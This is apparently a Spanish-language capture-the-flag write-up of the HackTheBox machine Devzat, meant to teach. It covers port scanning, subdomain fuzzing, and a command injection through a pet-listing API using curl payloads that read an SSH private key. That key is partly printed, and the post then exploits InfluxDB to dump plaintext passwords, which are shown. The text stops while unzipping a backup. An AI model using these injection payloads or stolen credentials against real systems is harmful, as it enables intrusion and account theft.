---
layout      : post
title       : "HackTheBox - Devzat"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389banner.png
category    : [ htb ]
tags        : [ ssh-keys, InfluxDB, devzat (github), path-traversal, command-injection ]
---
M√°quina Linux nivel medio. Chatearemos (realmente robaremos chats) con `SSH`, inyectaremos comandos locochones, romperemos `InfluxDB` y leeremos archivos del sistema mediante un `LFI`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389devzatHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [c1sc0](https://www.hackthebox.eu/profile/34604).

Vamos a chatear, pero con respeto.

Encontraremos un servidor web que nos ense√±a el c√≥mo chatear mediante **SSH** :O Jugaremos con esto para descubrir algunas conversaciones privadas entre usuarios del sitio.

Tambi√©n encontraremos un subdominio algo escondido, peeero m√°s escondida estar√° la inyecci√≥n de comandos que explotaremos en ese nuevo subdominio (: As√≠ lograremos una sesi√≥n en el sistema como el usuario `patrick`.

Ac√° retomaremos nuestro chat y las conversaciones filtradas para jugar con la base de datos `InfluxDB`, la explotaremos y obtendremos unas credenciales guardadas ah√≠, estas nos permitir√°n acceder al sistema como el usuario `catherine`.

Ya siendo **catherine**, **patrick** le comenta (volvemos a robarnos chats) que existe un feature para el programa que permite el chat por SSH. El feature es un simple "copy/paste file", b√°sicamente podemos copiar archivos del sistema dentro del chat, la locura es que no esta bien sanitizado yyyy podemos leer archivos como `root` yyyyyyy leer **cualquier objeto** del sistema, robaremos la llave privada **SSH** de `root` para obtener una Shell en el sistema.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389statistics.png" style="width: 80%;"/>

Algo de enumeraci√≥n, pero poca realidad :'(

> La idea inicial de esta locura es tener mis "notas" por si algun d√≠a se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¬øpor que no hacerlo? ... Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

Parce, simplemente vive!

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Recorridos por el puerto 80](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [Encontramos extra√±o Command Injection](#pets-command-injection).
4. [Jugamos con **InfluxDB**](#influxdb).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Como siempre vamos a descubrir que servicios tiene activos y accesibles p√∫blicamente la m√°quina, usaremos `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.11.118 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Mon Feb 21 25:25:25 2022 as: nmap -p- --open -v -oG initScan 10.10.11.118
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.118 () Status: Up
Host: 10.10.11.118 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8000/open/tcp//http-alt///
# Nmap done at Mon Feb 21 25:25:25 2022 -- 1 IP address (1 host up) scanned in 220.73 seconds
```

El escaneo encontr√≥ estos puertos (servicios):

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Permite obtener una terminal de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor web. |
| 8000   | **HTTP**: Otro servidor web. |

Ahora que tenemos los puertos (servicios), vamos a ver que software y versi√≥n en espec√≠fica (si es que la muestra) esta ejecut√°ndose en cada uno, as√≠ mismo probaremos peque√±os scripts propios de `nmap` para intentar descubrir m√°s cositas:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (esto es m√°s √∫til en casos donde tenemos muuuuchos puertos):**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.118
    [*] Open ports: 22,80,8000

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,8000 -sC -sV 10.10.11.118 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Este es el resultado:

```bash
# Nmap 7.80 scan initiated Mon Feb 21 25:25:25 2022 as: nmap -p 22,80,8000 -sC -sV -oN portScan 10.10.11.118
Nmap scan report for 10.10.11.118
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=2/21%Time=6214602E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 25:25:25 2022 -- 1 IP address (1 host up) scanned in 44.95 seconds
```

Ac√° vemos temitas relevantes:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2 protocol 1 |
| 80     | HTTP     | Apache 2.4.41 |

> Ac√° el servidor intenta hacer un redirect (enviarnos a otra p√°gina) hacia `http://devzat.htb`, pero no lo logra porque no entiende que "resolver", ya hablaremos r√°pidamente de esto.

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 8000   | SSH (?)  | Si nos fijamos, casi al final dice: `SSH-2.0-Go` |

* Curiosa y extra√±amente `nmap` lo interpreta como otro servidor **SSH**, jmmmm...

Pues no hay mucho m√°s que podamos rescatar, as√≠ que empecemos a jugar (:

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Recorridos por el puerto 80 [üìå](#puerto-80) {#puerto-80}

Antes de explorar, recordemos el redirect mostrado por `nmap`. Lo que pasa es que el servicio cuando recibe una petici√≥n hacia la direcci√≥n IP `10.10.11.118` intenta que su contenido sea resuelto por el del dominio `devzat.htb`, pero como no hay ninguna relaci√≥n actual entre la IP y el dominio, nos da un error y claramente no podemos ver el contenido.

Esto se soluciona muuy f√°cil, jugando con el archivo [/etc/hosts](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/) para que exista la relaci√≥n y, por lo tanto, una resoluci√≥n correcta:

```bash
‚ù± cat /etc/hosts
...
10.10.11.118  devzat.htb
...
```

Ahora s√≠, visitemos el sitio y no deber√≠a existir error:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80.png" style="width: 100%;"/>

En la web tenemos este texto:

> So basically I offer you a way to chat anytime from everywhere (well at least if you have a ssh client available)

Jmmmmm, ¬øchatear mediante SSH? Recordemos que ten√≠amos un puerto con al parecer otro SSH... Siguiendo en la web, al final vemos:

Como conectarnos al chat:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_sshPart.png" style="width: 100%;"/>

Un email con el username `patrick`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_emailPatrick.png" style="width: 70%;"/>

Podemos guardarlo por si algo... Para destacar, veamos el chat:

```bash
‚ù± ssh lanz@devzat.htb -p 8000
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_sshChat_welcome.png" style="width: 100%;"/>

```bash
...
devbot: You seem to be new here lanz. Welcome to Devzat! Run /help to see what you can do.
...
```

### RabbitHole (perdiendo el tiempo)

Contamos con un apartado para escribir, veamos la ayuda:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_sshChat_help.png" style="width: 100%;"/>

Entre todo lo que podemos enumerar y jugar, destacamos el link del proyecto y el comando `/commands`...

* [https://github.com/quackduck/devzat](https://github.com/quackduck/devzat)
* `/commands`

Jugando con los comandos no llegamos a ning√∫n sitio, son cositas interesantes para hacer (chatear en privado, cambiar el color del nickname, jugar tetris, crear cuartos para hablar, entre otras), pero que no nos sirven para intentar juaquiarlo

Despu√©s de perder MUCHO tiempo (mucho enserio) buscando entre los commits y en los issues posibles fallos que permitieran alg√∫n tipo de explotaci√≥n, tomamos aire y pensamos distinto...

### Salimos del RabbitHole

Si tenemos memoria (o en su defecto, notas (como yo :P)) tenemos el nombre `patrick`, si intentamos iniciar sesi√≥n con ese nickname nos responde:

```bash
‚ù± ssh patrick@devzat.htb -p 8000
Nickname reserved for local use, please choose a different one.
> 
```

Reservado para uso local... PEEEEEROOOO y si intentamos algo como `pAtrick` o `paTrick` o alg√∫n cambio con respecto a `patrick` tenemos esto:

```bash
‚ù± ssh patrick@devzat.htb -p 8000
Nickname reserved for local use, please choose a different one.
> paTRick
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_sshChat_paTRick_messagesWITHadmin.png" style="width: 100%;"/>

Uuuuuuh, podemos saltar la lista negra de usuarios (si intentamos `admin` tambi√©n sale el mensaje, pero `Admin` (y otros) lo bypassea) e ingresar como `patrick` :O PEERO esto no es lo mejor, si es que no has visto hay una conversaci√≥n guardada con el usuario **admin** con una l√≠nea clave:

> So I setup the [influxdb](https://www.ionos.es/digitalguide/hosting/cuestiones-tecnicas/que-es-influxdb/) for you

Jmmm, existe una configuraci√≥n de la base de datos [**InfluxDB**](https://www.ionos.es/digitalguide/hosting/cuestiones-tecnicas/que-es-influxdb/), esta DB esta especializada en guardar datos cient√≠ficos que se generan en muuuy poco tiempo (o sea, muuuuchos datos).

Interesante. Pero jugando con exploits nos indica que necesitamos el puerto `8086` expuesto (y no podemos pensar en otro porque los dem√°s que est√°n abiertos ya sabemos para qu√© son), as√≠ que F, no hay manera de probarlos... Sigamos a ver si nos encontramos...

Al no tener nada en la propia web ni en el c√≥digo fuente, no ver ning√∫n link interesante, o sea, estar nulos, ac√° se nos ocurre algo. ¬øY si fuzzeamos buscando posibles **subdominios** asociados al dominio principal (host)? Intent√©moslo, usar√© la herramienta [wfuzz](https://github.com/xmendez/wfuzz):

```bash
‚ù± wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.118 -H 'Host: FUZZ.devzat.htb'
```

Le indicamos el wordlist (lista de palabras que probar√°), la direcci√≥n IP del host y modificamos uno header llamado `Host`, ac√° le pasamos cada una de las palabras para que sean concatenadas con el dominio principal, por ejemplo: la palabra es `hola`, el programa generar√° una petici√≥n web a `hola.devzat.htb` y si la respuesta es un `200 Ok` sabemos que ese subdominio esta asociado al host.

Al ejecutarlo nos muestra muchos falsos positivos:

```bash
...
000000003:   302        9 L      26 W       282 Ch      "ftp"
000000007:   302        9 L      26 W       286 Ch      "webdisk"
000000026:   302        9 L      26 W       282 Ch      "vpn"
000000025:   302        9 L      26 W       284 Ch      "mail2"
000000024:   302        9 L      26 W       284 Ch      "admin"
...
```

Los quitamos filtrando por alguna de las columnas, en este caso tomemos el n√∫mero de palabras (`W`):

```bash
‚ù± wfuzz -c --hw=26 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.118 -H 'Host: FUZZ.devzat.htb'
```

As√≠ que mostrar√° toda respuesta que no tenga **26** palabras, despu√©s de un rato nos responde:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_wfuzz_foundSubDomain_pets.png" style="width: 100%;"/>

Opa, tenemos un posible subdominio, agregu√©moslo al objeto `/etc/hosts` para que resuelva con respecto a la info del host (`10.10.11.118`):

```bash
‚ù± cat /etc/hosts
...
10.10.11.118  devzat.htb pets.devzat.htb
...
```

Yyy veamos que responde:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_pets.png" style="width: 100%;"/>

Jmmm, una lista de mascotas (no s√© en qu√© se relaciona con la info del host :P), al final hay un apartado para agregar una mascota y su especie:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_pets_addPet_blank.png" style="width: 100%;"/>

Pues juguemos a agregar cositas ü•µ ...

Al colocar el nombre de mascota `<h1>hola</h1>` (para inyectar c√≥digo HTML y buscar posible XSS), vemos una curiosa respuesta al agregar el √≠tem:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_pets_addPet_H1holaH1.png" style="width: 100%;"/>

Jmmmmmmmmm...

> exit status 1

De inmediato me llegaron a la cabeza los [errores de **Linux**](https://mariadb.com/kb/en/operating-system-error-codes/) (el `1` sale cuando hay errores ejecutando alg√∫n comando), no tiene porque estar relacionado, pero es llamativo, por lo que podemos intentar alg√∫n tipo de inyecci√≥n de comandos, uno nunca sabe :P

Jugando y jugando con el apartado **Add a Pet** no logramos nada, profundizando en como viaja la petici√≥n al a√±adir una mascota notamos que hay una **API**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_pets_addPet_foundAPI.png" style="width: 100%;"/>

Pues inspeccion√©mosla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389page80_pets_API_with_hola.png" style="width: 100%;"/>

Bien, para destacar:

* Formato `JSON`.
* Existen 2 campos m√°s en la respuesta de la petici√≥n, pero solo uno de ellos es el que viaja inicialmente desde **Add a Pet**, `name`.

Si nos fijamos en la imagen donde encontramos la API hay dos peticiones, lo que hace es que primero **post**ea el √≠tem y luego los recupera (get) para mostrarlos en la pantalla principal, as√≠ que si queremos jugar con esto debemos hacer esas dos peticiones tambi√©n, para agregarlo y para ver la respuesta. Usemos `cURL` y la terminal as√≠ estamos m√°s c√≥modos:

Primero juguemos con los campos que recibe la API:

* name
* species
* characteristics

---

```bash
‚ù± curl -s -d '{"name":"hola"}' http://pets.devzat.htb/api/pet
Pet was added successfully
```

> Con `-s` evitamos output no deseado de cURL y con `-d` le pasamos la DATA de la petici√≥n, en este caso debe ser JSON.

Como ese mensaje de respuesta no nos interesa y s√≠ lo nuevo agregado a la API, [quitamos todo output del primer comando](https://www.baeldung.com/linux/silencing-bash-output) y seguido hacemos petici√≥n a recurso que tiene la info de la API:

```bash
‚ù± curl -s -d '{"name":"hola"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet
[{"...
...
..."},{"name":"hola","species":"","characteristics":"exit status 1"}]
```

Bien, si queremos podemos usar una herramienta llamada [jq](https://www.baeldung.com/linux/jq-command-json) que tomara el JSON resultante y le dar√° un output muuucho m√°s lindo y est√©tico:

```bash
‚ù± curl -s -d '{"name":"hola"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet | jq
...
  },
  {
    "name": "hola",
    "species": "",
    "characteristics": "exit status 1"
  }
]
```

AHORA SI A JUGAR Y EXPERIMENTAR CON LOS CAMPOOOOOOOOOOOOOOOOOOS (:

# Explotaci√≥n [#](#explotacion) {#explotacion}

Ya probamos antes inyectando √∫nicamente el campo `name` y nada de nada, aprovechemos que tenemos interacci√≥n con otros dos campos para testear...

```bash
‚ù± curl -s -d '{"name":"hola","species":"hola"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet | jq
...
  },
  {
    "name": "hola",
    "species": "hola",
    "characteristics": "exit status 1"
  }
]
```

Bieeen, tambi√©n lo env√≠a, pero `characteristics` no:

```bash
‚ù± curl -s -d '{"name":"hola","species":"hola","characteristics":"hola"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet | jq
...
  },
  {
    "name": "hola",
    "species": "hola",
    "characteristics": "exit status 1"
  }
]
```

As√≠ que juguemos inicialmente con `species`...

## Encontramos extra√±o Command Injection [üìå](#pets-command-injection) {#pets-command-injection}

Teniendo en mente que quiz√°s exista un [command injection](https://owasp.org/www-community/attacks/Command_Injection) probamos el cl√°sico `;` para decirle que despu√©s del comando que est√© ejecutando la web (si es que nuestra teor√≠a es real) haga lo que sea que le pongamos (otro comando claramente), por ejemplo `id`:

```bash
‚ù± curl -s -d '{"name":"hola","species":"; id"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet | jq
```

Ejecutamos yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_curl_petsAPI_commandInjection_id.png" style="width: 100%;"/>

EJEJEEEEEEEEY, el comando `id` se ha ejecutadoooooooOOOOOOOOOOO (:D El tema es que el sistema intenta buscar dentro del directorio `characteristics` suponemos que algo relacionado con `species`, como no lo encuentra devuelve el error `1`:

```bash
# EJEMPLO
‚ù± ls -la
...
drwxr-xr-x 1 lanz lanz  46 feb 22 25:25 content
‚ù± cat content/
'content/' is a directory.
‚ù± echo $?   # As√≠ vemos el codigo de estado del comando anterior
1
‚ù± cat content/; id   # Y as√≠ se genera el command injection
'content/' is a directory.
uid=1000(lanz) gid=1000(lanz) grupos=1000(lanz)
# EJEMPLO
```

Y pues finaliza ejecutando la otra instrucci√≥n: `id` :D

PerfecTOOOOTOTOTO, el usuario que esta manteniendo el servidor web se llama `patrick` (ya hab√≠amos interactuado con este nombre ¬ølo recuerdas?)... Ahora consigamos una Shell en el sistema, ¬øno?

Entre tooodas las formas posibles, ¬øy si buscamos una [llave privada SSH](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2) a ver si podemos tomarla, copiarla y conectarnos al sistema sin necesidad de colocar contrase√±a o de estar creando reverse shells? A darle a ver si hay suerte:

> Lo haremos manual, pero al final de este apartado dejare un script para automatizar el **command injection**.

---

```bash
‚ù± curl -s -d '{"name":"hola","species":"; ls -a /home"}' http://pets.devzat.htb/api/pet ...
...
    ..."cat: characteristics/: Is a directory\n.\n..\ncatherine\npatrick\n"
...
```

Hay dos usuarios en el sistema con casita, `catherine` (podemos listar m√°s no ver sus archivos) y `patrick` tiene la carpeta `.ssh`:

```bash
‚ù± curl -s -d '{"name":"hola","species":"; ls -a /home/patrick"}' http://pets.devzat.htb/api/pet > /dev/null ; curl -s http://pets.devzat.htb/api/pet | jq
...
    ..."cat: characteristics/: Is a directory\n.\n..\n.bash_history\n.bash_logout\n.bashrc\n.cache\n.config\ndevzat\n.gitconfig\n.gnupg\ngo\n.npm\npets\n.profile\n.ssh\n.viminfo\n"
...
```

Varios objetos (notamos que **catherine** es la que tiene la flag `user.txt`), veamos si existen las llaves:

```bash
‚ù± curl -s -d '{"name":"hola","species":"; ls -a /home/patrick/.ssh"}' http://pets.devzat.htb/api/pet ...
...
    ..."cat: characteristics/: Is a directory\n.\n..\nauthorized_keys\nid_rsa\n"
...
```

Existeeeeee! Tom√©mosla y copiemos su contenido:

```bash
‚ù± curl -s -d '{"name":"hola","species":"; cat /home/patrick/.ssh/id_rsa"}' http://pets.devzat.htb/api/pet ...
...
    "characteristics": "cat: characteristics/: Is a directory\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEA0z5vGXu4rlJWm2ffbekliU8N7KSuRj9tahP...
...
```

Copiamos desde `-----BEGIN OPENSSH PRIVATE KEY-----` hasta `-----END OPENSSH PRIVATE KEY-----` y pegamos (que les quede sin espacios ni saltos) en un archivo de nuestro sistema, el archivo nos va a quedar con un formato est√©ticamente incorrecto, ya que los saltos de l√≠nea no los va a interpretar, as√≠ que para que sean interpretados le decimos que cambie `\n` (salto) a `\r` ([retorno de carro](https://www.google.com/search?client=firefox-b-d&q=retorno+de+carro)):

```bash
‚ù± vim patrick.id_rsa
ESC
Shift + :       # Y escribimos lo de abajo
:%s/\\n/\r/g
```

YYyyyy:

```bash
‚ù± cat patrick.id_rsa  | head
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0z5vGXu4rlJWm2ffbekliU8N7KSuRj9tahP3+xTk/z/nKzb2UCi7
...
```

Perfecto, procedamos a jugar...

Con `SSH` le indicamos que vamos a iniciar sesi√≥n por medio de una llave privada (as√≠ no nos pide contrase√±a) usando el argumento `-i`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_patrickSH.png" style="width: 100%;"/>

Tenemos una Shell en el sistema por medio de **SSH** como el usuario **PATRIIIIIIIIIIIIIIIIIIICK**, sigamos (:

...

Aprovechamos la oportunidad para crear un script en `Ruby` automatizando tooooda la explotaci√≥n.

> [commandInjectionAT.rb](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/devzat/commandInjectionAT.rb)

... Ahora si d√©mosle a la m√°quina.

# InfluxDB : Patrick -> Catherine [#](#influxdb) {#influxdb}

Antes de volvernos locos enumerando el sistema, recordemos la conversaci√≥n de **Patrick** y **Admin**, ellos hablaban sobre `InfluxDB` yyy en nuestra enumeraci√≥n vimos que por lo general en caso de estar activo, se encuentra en el puerto `8086`, pues veamos si ese puerto esta activo (y si no, nos fijar√≠amos en los otros, quiz√°s el admin cambio el puerto por default):

```bash
patrick@devzat:~$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
...
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN
...
```

Y tenemos ese puerto activo internamente, pos aprovechemos esto para probar el exploit que se hab√≠a encontrado:

* [InfluxDB - CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

La vaina es que para ejecutar el script se necesitan algunas librer√≠as que no tiene el sistema instaladas, esto ser√≠a un problema si es que se nos llegase a olvidar el concepto -[redireccionamiento de puertos](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos)-, ya que con √©l podemos jugar indicando que el contenido de un puerto (en este caso el **8086** de `devzat`) sea redirigido a otro puerto (en este caso alguno de nuestro sistema (en el que podemos controlar que librer√≠as instalar y que no)), veamos:

Como tenemos "credenciales", podemos seguir usando `SSH` para esta tarea, √∫nicamente le decimos que tome el puerto `8086` del localhost (devzat) y lo redirija al puerto `8086` pero de nuestro localhost (m√°quina del atacante):

* [How to use SSH Port Fortwarding](https://phoenixnap.com/kb/ssh-port-forwarding).
* [How to set up SSH Port Fortwarding](https://linuxize.com/post/how-to-setup-ssh-tunneling/).

---

```bash
‚ù± ssh patrick@devzat.htb -i patrick.id_rsa -L 8086:localhost:8086 
```

Lo ejecutamos yyy para validar que efectivamente se haya realizado el Fortwarding, podemos ver que info del puerto actualmente (pues en nuestra m√°quina):

```bash
‚ù± lsof -i:8086
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ssh     435685 lanz    4u  IPv6 1547604      0t0  TCP localhost:8086 (LISTEN)
ssh     435685 lanz    5u  IPv4 1547605      0t0  TCP localhost:8086 (LISTEN)
```

PEEEEEEEERFEEECTO, ya tenemos el contenido del puerto `8086` (de **devzat**) en nuestro sistema, ahora si a probaaaaar...

* [InfluxDB - CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

Lo descargamos, ejecutamos y nos va a pedir 3 par√°metros, host y puerto donde esta corriendo **InfluxDB** y un usuario (o lista de usuarios) v√°lido dentro de la DB. Probando por default tanto a `patrick` como a `catherine` no logramos nada y recibimos esta respuesta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_PY_influxDB_params_HostYPort.png" style="width: 100%;"/>

Peeero si probamos `admin`, tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_PY_influxDB_vulnerableWITHadmin.png" style="width: 100%;"/>

Bien, la versi√≥n actual de **InfluxDB** es vulnerable al exploit, as√≠ que veamos que podemos hacer dentro de la "fake" shell generada por el script (:

Con ayuda de [esta gu√≠a](https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb) podemos interactuar con la info de la base de datos:

* [8086 - Pentesting InfluxDB](https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb).

Ya tenemos las bases de datos actuales:

```mysql
Databases:

1) devzat
2) _internal
```

Veamos la info de `devzat`:

```bash
[admin@127.0.0.1] Database: 1

Starting InfluxDB shell - .back to go back
[admin@127.0.0.1/devzat] $
```

Para visualizar las tablas asociadas a esa base de datos:

```bash
[admin@127.0.0.1/devzat] $ SHOW measurements
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_PY_influxDB_exploit_SHOWmeasurements.png" style="width: 100%;"/>

Hay una sola tabla llamada `user`, para dumpear su contenido ejecutamos:

```bash
[admin@127.0.0.1/devzat] $ SELECT * FROM "user"
```

YyyyyiiiIi:

```json
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Opa, usuarios y contrase√±as... Si damos un recorrido r√°pido por los nombres claramente uno nos llama la atenci√≥n (igual guardamos todos por si). 

Ah√≠ esta **Catherine**, un nombre que tambi√©n esta como usuario del sistemaaaaaaa! Pos rob√©monos su contrase√±a y hagamos lo que siempre toca hacer, validar una **reutilizaci√≥n de contrase√±as** (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH.png" style="width: 100%;"/>

EPAAALEEE! Tenemos una sesi√≥n en el sistema como `catherine` üòè Veamos ahora como convertirnos en administradores.

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Al jugar con el chat **SSH** logramos saltar la lista negra relacionada con `patrick`, en su momento me dio curiosidad probar con respecto a `catherine` y esto fue lo que me encontr√©:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_sshChat_catherineWITHpatrick.png" style="width: 100%;"/>

**Patrick** habla con **Catherine** sobre un nuevo feature y le indica varias cositas:

* Puede probarlo localmente, ya que la versi√≥n en desarrollo esta alojado en el puerto `8443`.
* Para usarlo se necesita una contrase√±a que ella ya tiene (jmmm, quiz√°s alguna de las que encontramos?).
* Yyyy que le dejo el c√≥digo fuente para que ella lo revise en **backups**.

Bieeeeen, evitamos deambular por el sistema (: Solo nos queda explorar esas referencias y ver que tienen de importante.

Busquemos en el sistema archivos que en su nombre tengan `"backups"`:

```bash
catherine@devzat:~$ find / -name "backups" 2>/dev/null
/snap/core18/2128/var/backups
/snap/core18/2074/var/backups
/var/backups
```

Los 3 resultados son directorios, el √∫ltimo tiene esta info:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_lsLA_varBackups_filesOFcatherine.png" style="width: 100%;"/>

Si nos fijamos hay dos objetos que pertenecen a `catherine` yyyyyyy uno de ellos tiene relaci√≥n con la conversaci√≥n entre ella y **patrick**: est√°n los objetos (al parecer) de la versi√≥n en desarrollo, pues copi√©monos ese objeto y transfir√°moslo a nuestro sistema para ver su contenido con calma, levantamos r√°pidamente un servidor web en la m√°quina v√≠ctima y desde nuestra m√°quina atacante tomamos el archivo para guardarlo:

```bash
catherine@devzat:/var/backups$ python3 -m http.server 8765
Serving HTTP on 0.0.0.0 port 8765 (http://0.0.0.0:8765/) ...
```

```bash
‚ù± curl http://10.10.11.118:8765/devzat-dev.zip -o devzat-dev.zip
```

Yyyy:

```bash
‚ù± file devzat-dev.zip 
devzat-dev.zip: Zip archive data, at least v1.0 to extract
```

Listo, descomprimamos su contenido:

```bash
